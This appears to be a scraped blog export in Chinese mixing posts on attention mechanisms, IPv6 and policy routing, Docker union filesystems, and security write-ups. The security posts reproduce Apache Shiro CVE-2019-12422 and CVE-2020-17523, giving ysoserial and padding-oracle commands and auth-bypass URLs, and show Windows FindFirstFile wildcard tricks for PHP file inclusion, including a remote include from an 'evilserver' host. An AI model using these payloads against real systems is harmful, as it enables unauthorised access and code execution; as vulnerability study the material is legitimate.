查询、键和值的不同：在自注意力机制中，查询、键和值都是从同一个输入序列中提取得到的，而在交叉注意力机制中，查询和值是从输出序列中提取得到的，键则是从另一个输入序列中提取得到的。 实现的不同：自注意力机制和交叉注意力机制在实现上也略有不同。在自注意力机制中，我们可以通过一个线性变换对输入序列进行映射，然后基于映射后得到的特征向量进行查询、键和值的计算。而在交叉注意力机制中，我们需要将不同的输入序列映射到同一维度上，然后进行类似的计算。 应用的不同：自注意力机制主要应用于单个输入序列的处理，可以用于语言建模、情感分析等任务。而交叉注意力机制则主要应用于关联不同的输入序列，可以用于机器翻译、图像描述等任务。 综上所述，自注意力和交叉注意力在输入、查询、键和值的不同、实现方式和应用场景的不同，因此在具体应用时需要酌情选择。 例子 1. 自注意力和交叉注意力 例子 自注意力机制的一个例子是Transformer架构中的编码器和解码器的每一层都有一个自注意力子层，它可以让模型学习到序列中每个位置与其他位置的关系。1 交叉注意力机制的一个例子是Transformer架构中的解码器的第二个子层，它可以让模型学习到目标序列与源序列之间的对齐关系。1 下面是一个自注意力机制和交叉注意力机制的图示： 123456789101112Self-attention:Q = K = V = [x1, x2, ..., xn] (a single sequence)Attention(Q, K, V) = softmax(QK^T / sqrt(d))VCross-attention:Q = [y1, y2, ..., ym] (target sequence)K = V = [x1, x2, ..., xn] (source sequence)Attention(Q, K, V) = softmax(QK^T / sqrt(d))V 2. 交叉注意力多模态翻译 一个交叉注意力应用于多源机器翻译的例子是多模态机器翻译，它可以让模型同时使用图像和文本作为输入，生成目标语言的文本输出。1 一个交叉注意力应用于多模态融合的例子是视频分类，它可以让模型同时使用视觉和听觉信息作为输入，生成视频类别的输出。2 下面是一个多模态机器翻译的图示： 1234567891011Image: [x1, x2, ..., xn] (image features)Text: [y1, y2, ..., ym] (source text tokens)Encoder: Image + Text -&gt; [z1, z2, ..., zn+m] (concatenated features)Decoder: [z1, z2, ..., zn+m] -&gt; [w1, w2, ..., wk] (target text tokens)Cross-attention: Attention([w1], [z1,...zn+m]) -&gt; a11 Attention([w2], [z1,...zn+m]) -&gt; a21 ... Attention([wk], [z1,...zn+m]) -&gt; ak(n+m) 其中，Image和Text是两个不同类型的输入序列，Encoder是一个编码器网络，Decoder是一个解码器网络，Cross-attention是一个交叉注意力机制，Attention是一个注意力函数，a11,a21,…ak(n+m)是注意力权重。3 注意力机制作用被高估了？苹果等机构新研究：把注意力矩阵替换成常数矩阵后，性能差异不大 【经典精读】Transformer模型和Attention机制 Pytorch中 nn.Transformer的使用详解与Transformer的黑盒讲解 Refer self attention PPT 台大李宏毅21年机器学习课程 self-attention和transformer"},{"title":"二级路由ipv6地址下发","date":"2022-06-28","updated":"2024-03-19","path":"2022/06/28/二级路由ipv6地址下发/","text":"首先各个 /64 的意义是不一样的，通过 SLAAC 获得的只是一个地址，里面的“前缀长度”字段（值为“/64”）只是相当于 ipv4 的子网掩码的含义，只是提示了同一网段（ WAN 侧）的地址范围，同前缀的其它地址是不属于你的。所以说当路由器仅获取 WAN 地址时（无论是通过 SLAAC 还是 DHCPv6 IA_NA，前者只支持 /64，后者支持任意的前缀长度，注意这两种方式获取到的都是“地址”而不是“前缀”），LAN 端设备是无法直接获得 IPv6 全球单播地址（就是 2 开头的公网地址）的。 然后还有另外一种操作是 DHCPv6 IA_PD，这种操作可以向上级网络请求一个 IPv6 的前缀，一般家宽运营商给出的前缀长度都是 /56 或者 /60 的，也有极少情况是 /64 的。通过这种方式获取到的是“前缀”而不是“地址”，也就是说同前缀的 2^(128-PREFIX_LEN)个地址都是属于你的。这就是 DHCPv6 IA_PD 和其它地址获取方式（ SLAAC 和 DHCPv6 IA_NA ）的本质不同之处。 家宽单层路由器（包括光猫自带路由，以及光猫桥接路由拨号两种情况）的一般工作方式：首先路由器（路由模式光猫）建立 PPPoE 链路，然后通过 SLAAC 获取 WAN 侧地址（一般情况下前缀长度为 /64 ），然后通过 DHCPv6 IA_PD 向 ISP 请求一个地址段，比如拿到的是一个 /56 的地址段，这些地址都是临时属于你的（ ISP 端在获取地址的那一刻就已经建立好了正确的路由）。然后重要的来了：路由器（路由模式光猫）从这 /56 的地址端中只取了一个 /64 的地址段作为前缀配置到了 LAN 接口上（包括本地路由器的路由表，自身 LAN 口地址，和负责分配地址的 RA 服务，有时候可能还有本地的 DHCPv6 服务），这样 LAN 侧的设备就可以通过相应的协议获取临时属于自己的公网地址了。至于为什么只取一个 /64 而不是整个 /56，是为了兼容 SLAAC 。 而且可以注意到，路由器 LAN 侧和 WAN 侧不是同一个网段，这也是 IP 协议的最基本要求（想想 v4 时代是怎么配置地址的） 这种情况下，还有 255 个 /64 全球可路由的地址段（或者也可以理解成 15 个 /64 地址段和 15 个 /60 地址段）是处于闲置状态的，理论上来说，一级路由器也可以响应 LAN 侧接入的下级路由器的 DHCPv6 IA_PD 请求，给下级路由器分配前缀（下级路由 WAN 侧通过 SLAAC 拿一级路由 LAN 侧的一个地址，LAN 侧拿一级路由从 ISP 得到且闲置的一段前缀，在这个过程中会自动配置好本地的路由表等参数），然后下级路由 LAN 侧连接的设备就也可以获得公网地址了。此时如果把 /56 改成 /60，也只是少一些可用地址段而已（只有 15 个 /64 地址段闲置），影响不大。如果一级路由器是 OpenWRT，是可以实现这种下发操作的。 所以说实际存在的问题并不是所谓的“/60 下发只有 /64 不能再下发”（实际上不存在这种说法），而是光猫自带路由根本不会正确响应下级路由器的 IA_PD 请求。 （我也见到过一些光猫，能够响应 IA_PD 请求，但是可能固件里有 bug 不能正确配置本地的路由表，导致二级路由后的设备能获取 ipv6 地址但不能上网） realy passthrough 路由拨号 + 二级路由IPv6中继 采用路由拨号 + 二级路由IPv6中继方式 路由器刷入openwrt固件 ssh登入路由器 如果中途刷机导致ssh连接失败执行以下命令 ssh-keygen -R “192.168.6.1” # ip地址替换为路由器ip 修改 vim /etc/config/dhcp 123456789101112# 添加一项 wan6 接口的配置config dhcp &#x27;wan6&#x27; option interface &#x27;wan6&#x27; option ra &#x27;relay&#x27; option dhcpv6 &#x27;relay&#x27; option ndp &#x27;relay&#x27; option master &#x27;1&#x27; # 修改 lan 接口中的字段 option ra &#x27;relay&#x27; option dhcpv6 &#x27;relay&#x27; option ndp &#x27;relay&#x27; 重启服务 /etc/init.d/odhcpd restart 重连wifi即可获取公网IPV6 设置IPv6 无状态地址生成模式 查看动态内核参数 sysctl -a | grep net.ipv6.conf.wlp0s20f3 =1时候 dc:71:96:7f:a6:3e 2409:8a3c:2270:b060:29b:fd53:666b:84c6/64 ea:57:5c:89:23:6d vim /etc/NetworkManager/NetworkManager.conf 12[connection]ip未完待续 光猫拨号,二级路由 IPV6 的正确设置教程 https://u.sb/debian-prefer-ipv4/ openwrt防火墙"},{"title":"路由策略ip rule","date":"2022-06-27","updated":"2024-03-19","path":"2022/06/27/路由策略ip-rule/","text":"一，路由策略（使用ip rule命令操作路由策略数据库） 基于策略的路由比传统路由在功能上更强大，使用更灵活，它使网络管理员不仅能够根据目的地址而且能够根据报文大小，应用或IP源地址等属性来选择转发路径。 ip rule命令： 1234567891011121314151617Usage: ip rule [ list | add | del ] SELECTOR ACTION （add 添加；del 删除； llist 列表） SELECTOR := [ from PREFIX 数据包源地址] [ to PREFIX 数据包目的地址] [ tos TOS 服务类型] [ dev STRING 物理接口] [ pref NUMBER ] [fwmark MARK iptables 标签] ACTION := [ table TABLE_ID 指定所使用的路由表] [ nat ADDRESS 网络地址转换] [ prohibit 丢弃该表| reject 拒绝该包| unreachable 丢弃该包] [ flowid CLASSID ] TABLE_ID := [ local | main | default | new | NUMBER ]#例子1：通过路由表 inr.ruhep 路由来自源地址为192.203.80/24的数据包ip rule add from 192.203.80/24 table inr.ruhep prio 220 #例子2：把源地址为193.233.7.83的数据报的源地址转换为192.203.80.144，并通过表1进行路由ip rule add from 193.233.7.83 nat 192.203.80.144 table 1 prio 320 在 Linux 系统启动时，内核会为路由策略数据库配置三条缺省的规则： 0：匹配任何条件，查询路由表local(ID 255)，该表local是一个特殊的路由表，包含对于本地和广播地址的优先级控制路由。rule 0非常特殊，不能被删除或者覆盖。 32766：匹配任何条件，查询路由表main(ID 254)，该表是一个通常的表，包含所有的无策略路由。系统管理员可以删除或者使用另外的规则覆盖这条规则。 32767：匹配任何条件，查询路由表default(ID 253)，该表是一个空表，它是后续处理保留。对于前面的策略没有匹配到的数据包，系统使用这个策略进行处理，这个规则也可以删除。 **注：**不要混淆路由表和策略：规则指向路由表，多个规则可以引用一个路由表，而且某些路由表可以策略指向它。如果系统管理员删除了指向某个路由表的所有规则，这个表没有用了，但是仍然存在，直到里面的所有路由都被删除，它才会消失。 linux 系统中，可以自定义从 1－252个路由表，其中，linux系统维护了4个路由表： 0#表： 系统保留表 253#表： defulte table 没特别指定的默认路由都放在改表 254#表： main table 没指明路由表的所有路由放在该表 255#表： locale table 保存本地接口地址，广播地址、NAT地址 由系统维护，用户不得更改 路由表的查看可有以下二种方法： 123ip route show table table_number ip route show table table_name 路由表序号和表名的对应关系在 /etc/iproute2/rt_tables文件中，可以手动编辑，路由表添加完毕及时生效，实例如下： 12345#实例1：在一号表中添加默认路由为192.168.1.1ip route add default via 192.168.1.1 table 1 #实例2：在一号表中添加一条到192.168.0.0网段的路由为192.168.1.2ip route add 192.168.0.0/24 via 192.168.1.2 table 1 二，路由表（使用ip route命令操作静态路由表） 所谓路由表，指的是路由器或者其他互联网网络设备上存储的表，该表中存有到达特定网络终端的路径，在某些情况下，还有一些与这些路径相关的度量。路由器的主要工作就是为经过路由器的每个数据包寻找一条最佳的传输路径，并将该数据有效地传送到目的站点。由此可见，选择最佳路径的策略即路由算法是路由器的关键所在。为了完成这项工作，在路由器中保存着各种传输路径的相关数据–路由表，供路由选择时使用，表中包含的信息决定了数据转发的策略。 三， ip rule，ip route，iptables 三者之间的关系 iptables：iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的&quot;安全框架&quot;中，这个&quot;安全框架&quot;才是真正的防火墙，这个框架的名字叫netfilter。 注：图中 “路由判断” 就是使用ip rule，ip route设置的规则，其中ip route配置的路由表服务于ip rule配置的规则。 以一例子来说明：公司内网要求192.168.0.100 以内的使用 10.0.0.1 网关上网 （电信），其他IP使用 20.0.0.1 （网通）上网。 1，首先要在网关服务器上添加一个默认路由，当然这个指向是绝大多数的IP的出口网关：ip route add default gw 20.0.0.1 2，之后通过 ip route 添加一个路由表：ip route add table 3 via 10.0.0.1 dev ethX (ethx 是 10.0.0.1 所在的网卡, 3 是路由表的编号) 3，之后添加 ip rule 规则：ip rule add fwmark 3 table 3 （fwmark 3 是标记，table 3 是路由表3 上边。 意思就是凡事标记了 3 的数据使用 table3 路由表） 4，之后使用 iptables 给相应的数据打上标记：iptables -A PREROUTING -t mangle -i eth0 -s 192.168.0.1 - 192.168.0.100 -j MARK --set-mark 3 https://zhuanlan.zhihu.com/p/144585950 https://www.cnblogs.com/wanstack/p/7728785.html"},{"title":"CVE-2020-17523_Apache_Shiro身份认证绕过","date":"2022-05-18","updated":"2024-03-19","path":"2022/05/18/CVE-2019-12422_Shiro_Remember反序列化漏洞/","text":"CVE-2019-12422 漏洞描述 Shiro RememberMe 反序列化漏洞 漏洞成因 由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。 shiro对于Cookie处理做了如下实现： 123456789101112131415161718192021222324252627282930protected byte[] decrypt(byte[] encrypted) &#123; byte[] serialized = encrypted; CipherService cipherService = getCipherService(); if (cipherService != null) &#123; ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey()); serialized = byteSource.getBytes(); &#125; return serialized;&#125;protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123; if (getCipherService() != null) &#123; bytes = decrypt(bytes); // decrypto &#125; return deserialize(bytes); // deserualize&#125;public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123; PrincipalCollection principals = null; try &#123; byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123; principals = convertBytesToPrincipals(bytes, subjectContext); &#125; &#125; catch (RuntimeException re) &#123; principals = onRememberedPrincipalFailure(re, subjectContext); // set-cookie: Remember=delete &#125; return principals;&#125; 传入的remember数值生成过程为： 1Base64Encode(IV+AES-128-CBC.encrypto(Serialize(object)))) 处理过程为： 1Deserialize(AES-128-CBC.decrypto(Base64Decode(Cookie))) 其中，对于正确和错误的密文，存在两种不同的反馈： 12无效rememberMe: 响应中存在 `Set-Cookie: rememberMe=deleteMe`有效rememberMe：响应中无 `Set-Cookie: rememberMe=deleteMe` 攻击流程： 登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。 使用RememberMe cookie作为Padding Oracle Attack的前缀。 加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。 重放恶意RememberMe cookie，以执行反序列化攻击。 漏洞影响面 Apache Shiro &lt; 1.4.2 复现步骤 登录Shiro网站，从cookie中获得rememberMe字段的值。 通过ysoserial工具生成payload.class 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/a&quot; &gt; payload.class 通过Padding Oracle Attack制作恶意RememberMe 1java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://192.168.120.128:8080/ CKbXTKhN5d69rUAGIh9f6WVJuICUQ28p2zsn10jkYsNI9KBLHE8zIILhipyeZoAtukQZRLLMrK3g29IAB+eMYcAN+cvD7I43BWvNw+BuFZHMa8lfM45xaoWpkkDLsGf1qDZgCo/y3jV0r7v8uf3RiHzTnCfVhT+n+6uaEzOj0qMbJJkhs26A3TZ8uOeHBis48p7CVq2Q3HcxCBPOLIlaHzqNSZgkljjWjy7mk0vsmygF2yj2pIrL1yfmr+5A6k/yM1iSRaWJCtUkj///xOSP/PtpfBLR2L/Y+kOhP4yethHMxRL/7c8vUKKcm+zQVpRaQZ7ooYgcMCpoFOc9tgb+9QYK6xQvgdd6sLwJWqQRn2xETqeLcGwt6M5oGHAHctJJd56ZuM7z6CZfpGRirbbM7X5b3mbywK8SXp9DNB8KkTDJPyfpPTHTq7pFXvXV/hP4ErGWJBr8xiqston5derEduXqvU7E2tzt4tVng3L0bAjsPRKgaSX/7xHE8OhO2Ovo 16 payload.class 爆破时间较长，爆破成功后会自动停止爆破 使用爆破结果的恶意RememberMe登录 ​ 在目标主机成功执行命令 ​ https://www.cnblogs.com/qianxinggz/p/13388405.html https://www.yuque.com/m1tang/gqsay7/qwegln https://www.cnblogs.com/qianxinggz/p/13388405.html https://www.cnblogs.com/xiaozi/p/13239046.html https://github.com/inspiringz/Shiro-721"},{"title":"CVE-2020-17523_Apache_Shiro身份认证绕过","date":"2022-05-18","updated":"2024-03-19","path":"2022/05/18/CVE-2020-17523_Apache_Shiro身份认证绕过/","text":"CVE-2020-17523 漏洞描述 Apache Shiro身份认证绕过漏洞 漏洞成因 Shiro中对于URL的获取及匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 先看下这个getChain方法： 12345678910111213141516171819202122232425262728293031323334353637public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123; FilterChainManager filterChainManager = getFilterChainManager(); if (!filterChainManager.hasChains()) &#123; return null; &#125; String requestURI = getPathWithinApplication(request); // in spring web, the requestURI &quot;/resource/menus&quot; ---- &quot;resource/menus/&quot; bose can access the resource // but the pathPattern match &quot;/resource/menus&quot; can not match &quot;resource/menus/&quot; // user can use requestURI + &quot;/&quot; to simply bypassed chain filter, to bypassed shiro protect if(requestURI != null &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(requestURI) &amp;&amp; requestURI.endsWith(DEFAULT_PATH_SEPARATOR)) &#123; requestURI = requestURI.substring(0, requestURI.length() - 1); &#125; //the &#x27;chain names&#x27; in this implementation are actually path patterns defined by the user. We just use them //as the chain name for the FilterChainManager&#x27;s requirements for (String pathPattern : filterChainManager.getChainNames()) &#123; if (pathPattern != null &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(pathPattern) &amp;&amp; pathPattern.endsWith(DEFAULT_PATH_SEPARATOR)) &#123; pathPattern = pathPattern.substring(0, pathPattern.length() - 1); &#125; // If the path does match, then pass on to the subclass implementation for specific checks: if (pathMatches(pathPattern, requestURI)) &#123; if (log.isTraceEnabled()) &#123; log.trace(&quot;Matched path pattern [&quot; + pathPattern + &quot;] for requestURI [&quot; + Encode.forHtml(requestURI) + &quot;]. &quot; + &quot;Utilizing corresponding filter chain...&quot;); &#125; return filterChainManager.proxy(originalChain, pathPattern); &#125; &#125; return null; &#125; 其中DEFAULT_PATH_SEPARATOR值被定义为/ 该方法先检查requestURI是否以/结尾，如果是，就删掉最后一个/。 然后在匹配路径的循环中，会先判断下路径规则pathPattern是否以/结尾，如果是也会删除。然后再去调用pathMatches()方法进行路径匹配。因此两种利用方式中，是否以/结尾都没有关系，因为开始经过getChain方法就会被删除。 空格绕过法分析 关注下pathMatches()方法： 1234protected boolean pathMatches(String pattern, String path) &#123; PatternMatcher pathMatcher = getPathMatcher(); return pathMatcher.matches(pattern, path);&#125; 追踪发现最终 matches(pattern, path)调用了AntPathMatcher.java#doMatch 测试一下pathMatches（&quot;/admin/*&quot;,&quot;/admin/1&quot;）和pathMatches（&quot;/admin/*&quot;,&quot;/admin/ &quot;），前者正常匹配，后者匹配失败。 开始调试，一直到doMatch(&quot;/admin/*&quot;,&quot;/admin/ &quot;)。可见，tokenizeToStringArray返回的pathDirs已经没有第二层路径了。因此会导致/admin/* 和/admin 不匹配。 跟一下tokenizeToStringArray方法，发现其调用tokenizeToStringArray方法时的trimTokens参数为true。 而tokenizeToStringArray方法，在参数trimTokens为true时，会经过trim()处理，因此导致空格被清除。再次返回getChain时最后一个/被删除。因此tokenizeToStringArray返回的pathDirs没有第二层路径。 总结一下：存在漏洞的shiro版本，由于调用tokenizeToStringArray方法时，trimTokens参数默认为true，空格会经过trim()处理，因此导致空格被清除。再次返回getChain时最后一个/被删除，所以/admin与/admin/*匹配失败，导致鉴权绕过。而Spring接受到的访问路径为/admin/%20，按照正常逻辑返回响应，因此导致权限被绕过。 /./绕过分析 分析normalize()方法，此方法在org.apache.*shiro*.web.util.WebUtils#normalize 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152private static String normalize(String path, boolean replaceBackSlash) &#123; if (path == null) return null; // Create a place for the normalized path String normalized = path; if (replaceBackSlash &amp;&amp; normalized.indexOf(&#x27;\\\\&#x27;) &gt;= 0) normalized = normalized.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); if (normalized.equals(&quot;/.&quot;)) return &quot;/&quot;; // Add a leading &quot;/&quot; if necessary if (!normalized.startsWith(&quot;/&quot;)) normalized = &quot;/&quot; + normalized; // Resolve occurrences of &quot;//&quot; in the normalized path while (true) &#123; int index = normalized.indexOf(&quot;//&quot;); if (index &lt; 0) break; normalized = normalized.substring(0, index) + normalized.substring(index + 1); &#125; // Resolve occurrences of &quot;/./&quot; in the normalized path while (true) &#123; int index = normalized.indexOf(&quot;/./&quot;); if (index &lt; 0) break; normalized = normalized.substring(0, index) + normalized.substring(index + 2); &#125; // Resolve occurrences of &quot;/../&quot; in the normalized path while (true) &#123; int index = normalized.indexOf(&quot;/../&quot;); if (index &lt; 0) break; if (index == 0) return (null); // Trying to go outside our context int index2 = normalized.lastIndexOf(&#x27;/&#x27;, index - 1); normalized = normalized.substring(0, index2) + normalized.substring(index + 3); &#125; // Return the normalized path that we have completed return (normalized);&#125; 其功能是： 条件 示例 正斜杠处理成反斜杠 \\ -&gt; / 双反斜杠处理成反斜杠 // -&gt; / 以/.或者/…结尾，则在结尾添加/ /. -&gt; /./ /… -&gt; /…/ 归一化处理/./ /./ -&gt; / 路径跳跃 /aaa/…/bbb -&gt; /bbb 所以/admin/.在被处理成/admin/./之后变成了/admin/。 再经过org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain处理，由于/结尾，如果是，就删掉最后一个/，变成了/admin。/admin与/admin/*不匹配，因此绕过了shiro鉴权。 漏洞影响面 Apache Shiro &lt; 1.7.1 复现步骤 下载shiro 1.7.0环境, 运行 %20绕过 访问http://10.17.34.7:9090/admin/%20 %2e绕过 访问http://10.17.34.7:9090/admin/%2e https://www.anquanke.com/post/id/216096 https://github.com/jweny/shiro-cve-2020-17523"},{"title":"windows下利用FindFirstFile进行目录遍历","date":"2022-05-18","updated":"2024-03-19","path":"2022/05/18/windows下利用FindFirstFile进行目录遍历/","text":"原理 Windows在搜索文件的时候使用到了FindFirstFile这一个winapi函数，该函数到一个文件夹（包括子文件夹）去搜索指定文件。 字符&gt;被替换成?，字符&lt;被替换成*，而符号&quot;（双引号）被替换成一个.字符。这在2007年msdn公开的文档中被提及：http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3 利用方法很简单，我们只要将文件名不可知部分之后的字符用&lt;或者&gt;,&lt;&lt;代替即可，不过要注意一点是，只使用一个&lt;或者&gt;则只能代表一个字符，如果文件名是12345或者更长，这时候请求&quot;1&lt;&quot;或者&quot;1&gt;&quot;都是访问不到文件的，需要&quot;1&lt;&lt;&quot;才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。 做个简单的测试，测试代码如下： 123&lt;?php include($_GET[&#x27;file&#x27;]);?&gt; 再在同目录下新建一个文件名为shell.txt的文件，内容为phpinfo()函数，请求/1.php?file=1&lt;&lt;即可包含。 利用方法总结 当调用FindFirstFile()函数时，&lt;被替换成”*,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，为了确保能够使&lt;被替换成*,应当采用&lt;&lt; 12include(&#x27;shell&lt;&#x27;);include(&#x27;shell&lt;&lt;&#x27;); //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，&gt;被替换成?,这意味这&gt;可以替换单个任意字符 1include(&#x27;shell.p&gt;p&#x27;); //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，&quot;(双引号)被替换成. 1include(&#x27;shell&quot;php&#x27;); //===&gt;include(&#x27;shell.php&#x27;); 如果文件名第一个字符是.的话，读取时可以忽略之 1fopen(&#x27;.htacess&#x27;); //==&gt;fopen(&#x27;htacess&#x27;); //加上第一点中的利用 ==&gt;fopen(&#x27;h&lt;&lt;&#x27;); 文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为. 1fopen(“config.ini\\.// ///.”);==&gt; fopen(&#x27;config.ini./..&#x27;); ==&gt;fopen(&#x27;config.ini/////.&#x27;)==&gt;fopen(&#x27;config.ini…..&#x27;) //译者注：此处的利用我不是很理解，有何作用？截断？ 该函数也可以调用以\\打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off并最终导致一个RFI（远程文件包含） 1include (&#x27;\\evilservershell.php&#x27;); 用以下方法还可以切换文件的盘名 11include(&#x27;\\.C:myfile.php......D:anotherfile.php&#x27;); 选择磁盘命名语法可以用来绕过斜线字符过滤 1file_get_contents(&#x27;C:boot.ini&#x27;); //==&gt; file_get_contents (&#x27;C:/boot.ini&#x27;); 在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节 123file_get_contents(&#x27;C:/tmp/con.jpg&#x27;); //此举将会无休无止地从CON设备读取0字节，直到遇到eoffile_put_contents(&#x27;C:/tmp/con.jpg&#x27;,chr(0×07)); //此举将会不断地使服务器发出类似哔哔的声音 更深入的利用方法 除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤 请思考该例： 1234&lt;?php file_get_contents(&quot;/images/&quot;.$_GET[&#x27;a&#x27;].&quot;.jpg&quot;); //or another function from Table 1, i.e. include().?&gt; 访问test.php?a=../a&lt;%00 可能出现两种结果 Warning: include(/images/…/a&lt;) [function.include]: failed to open stream:Invalid argument in。。。 Warning: include(/images/…/a&lt;) [function.include]: failed to open stream:Permission denied。。 如果是第一种情况，说明不存在a打头的文件，第二种则存在。 此外，有记录显示，有时网站会抛出如下错误： 1Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied.. 这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。 https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki"},{"title":"分布式互斥算法","date":"2022-05-11","updated":"2024-03-19","path":"2022/05/11/分布式互斥算法/","text":"算法介绍 性能比较 Lamport与R&amp;A算法流程 FIFO是通信发送接收的要求 不是存储队列 https://cs.stackexchange.com/questions/103839/what-is-a-counterexample-for-lamports-distributed-mutual-exclusion-algorithm-wi https://www.cs.uic.edu/~ajayk/Chapter9.pdf https://blog.csdn.net/baishuiniyaonulia/article/details/121844088 https://www.geeksforgeeks.org/lamports-algorithm-for-mutual-exclusion-in-distributed-system/ https://en.wikipedia.org/wiki/Ricart–Agrawala_algorithm https://www.youtube.com/watch?v=yBnRO2gGock"},{"title":"docker联合文件系统","date":"2022-05-09","updated":"2024-03-19","path":"2022/05/09/docker联合文件系统/","text":"什么是联合文件系统 联合挂载是一种文件系统，它可以在不修改其原始（物理）源的情况下创建多个目录，并把内容合并为一个文件的错觉。这可能很有用，因为我们可能将相关文件集存储在不同位置中，但我们希望在单个合并视图中显示它们。例如，来自远程 NFS 服务器的/home 主目录全部联合到一个目录中，或者将分割的 ISO 镜像合并到一个完整的目录中。 联合挂载或联合文件系统是文件系统；但不是文件系统类型，而是一个包含许多实现的概念。其中一些速度更快性能更好，一些更简单，有不同的使用场景或不同的成熟度。因此，在我们开始深入了解细节之前，让我们快速浏览一下常见文件系统的实现： UnionFS - 让我们从原始的联合文件系统开始。UnionFS 似乎不再积极开发，其最新提交是从 2014 年 8 月开始的。您可以在其网站https://unionfs.filesystems.org/上阅读更多有关它的信息。 aufs - 原始 UnionFS 的重新实现，添加了许多新功能，但因合并到主线 Linux 内核而被拒绝。Aufs 是 Ubuntu/Debian 上 Docker 的默认驱动程序，但被 OverlayFS 取代（对于 Linux 内核 &gt;4.0）。与 Docker 文档页面中描述的其他联合文件系统相比，它具有一些优势。 OverlayFS - 接下来是 OverlayFS，自 3.18（2014 年 10 月 26 日）起包含在 Linux 内核中。这是默认 overlay2Docker 驱动程序使用的文件系统（您可以使用 验证 docker system info | grep Storage）。它通常比 aufs 具有更好的性能，并且具有一些不错的功能，例如页面缓存共享。 ZFS - ZFS 是由 Sun Microsystems（现在是 Oracle）创建的联合文件系统。它有一些有趣的功能，如分层校验和、快照和备份/复制的本机处理或本机数据压缩和重复数据删除。但是，由 Oracle 维护，它具有非 OSS 友好许可 (CDDL)，因此不能作为 Linux 内核的一部分提供。但是，您可以在 Linux (ZoL)项目上使用 ZFS，Docker 文档中将其描述为健康和成熟的…，但尚未准备好用于生产。如果你想尝试一下，那么你可以在这里找到它。 Btrfs - 另一种选择是 Btrfs，它是多家公司（包括 SUSE、WD 或 Facebook ）的联合项目，在 GPL 许可下发布，是 Linux 内核的一部分。Btrfs 是 Fedora 33 的默认文件系统。它还具有一些有用的功能，例如块级操作、碎片整理、可写快照等等。如果您真的想解决为 Docker 切换到非默认存储驱动程序的麻烦，那么具有其功能和性能的 Btrfs 可能是您要走的路。 Docker 镜像、容器的基石——联合文件系统（UnionFS） 假设Dockerfile 内容如下 1234FROM ubuntu:14.04ADD run.sh /VOLUME /dataCMD [&quot;./run.sh&quot;]| 联合文件系统对应的层次结构如下图所示 Docker 文件系统(图片来源于网络).png FROM ubuntu:14.04 :设置基础镜像，此时会使用基础镜像ubuntu:14.04的所* 有镜像层，为简单起见，图中将其作为一个整体展示。 ADD run.sh /:将Dockerfile所在目录的文件run.sh加至镜像的根目录，此时新一层的镜像只有一项内容，即根目录下的run.sh. VOLUME /data:设定镜像的VOLUME，此VOLUME在容器内部的路径为/data。需要注意的是，此时并未在新一层的镜像中添加任何文件，但更新了镜像的json文件，以便通过此镜像启动容器时获取这方面的信息。 CMD [“./run.sh”]:设置镜像的默认执行入口，此命令同样不会在新建镜像中添加任何文件，仅仅在上一层镜像json文件的基础上更新新建镜像的json文件。 图中的顶上两层，是Docker为Docker容器新建的内容，而这两层属于容器范畴。 这两层分别为Docker容器的初始层(Init Layer)与可读写层(Read－Write Layer)。 初始层: 大多是初始化容器环境时，与容器相关的环境信息，如容器主机名，主机host信息以及域名服务文件等。 读写层: Docker容器内的进程只对可读写层拥有写权限，其他层对进程而言都是只读的(Read-Only)。 另外，关于VOLUME以及容器的hosts、hostname、resolv.conf文件等都会挂载到这里。 为什么 为什么 docker 等容器系统要使用类似的联合文件系统呢? 我们用来启动容器的许多镜像无论 ubuntu 是 72MB 还是 nginx 133MB 的大小都非常庞大。每次我们想从这些镜像创建一个容器时，分配这么多空间将是非常昂贵的。有了联合文件系统，Docker 只需要在镜像之上创建一个瘦文件层，其余的可以在所有容器之间共享。这还提供了减少启动时间的额外好处，因为无需复制镜像文件和数据。 联合文件系统还提供隔离功能，因为容器对共享镜像层具有只读访问权限。如果他们需要修改任何只读共享文件，他们会使用写时复制策略将内容复制到可以安全修改的可写层。 overlay是如何工作的 https://jishuin.proginn.com/p/763bfbd61dab aufs是如何工作的 读取文件 当我们在容器中读取文件时，可能会有以下场景。 文件在容器层中存在时：当文件存在于容器层时，直接从容器层读取。 